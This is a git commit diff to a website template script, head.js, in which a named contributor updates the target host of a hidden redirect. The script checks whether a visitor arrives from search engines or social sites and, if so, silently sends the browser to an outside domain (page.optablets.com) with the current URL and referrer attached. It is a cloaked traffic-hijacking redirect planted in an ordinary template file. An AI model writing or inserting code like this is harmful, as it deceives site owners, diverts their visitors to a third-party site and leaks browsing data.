4a79c2a68b081dc7af6adfaf8ec41b5ba74c973c
boogiebump <sabda.alam2308@gmail.com>
2024-10-24 02:20:45 +0700

    Update head.js

--- template/nexus/head.js
+++ template/nexus/head.js
@@ -28,5 +28,5 @@ document.write('</div>');
 document.write('</noscript>');
 
 ///// Arsae /////
-var ars = 'http://optablets.com';
+var ars = 'http://page.optablets.com';
 if(['.edu.', '.google.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
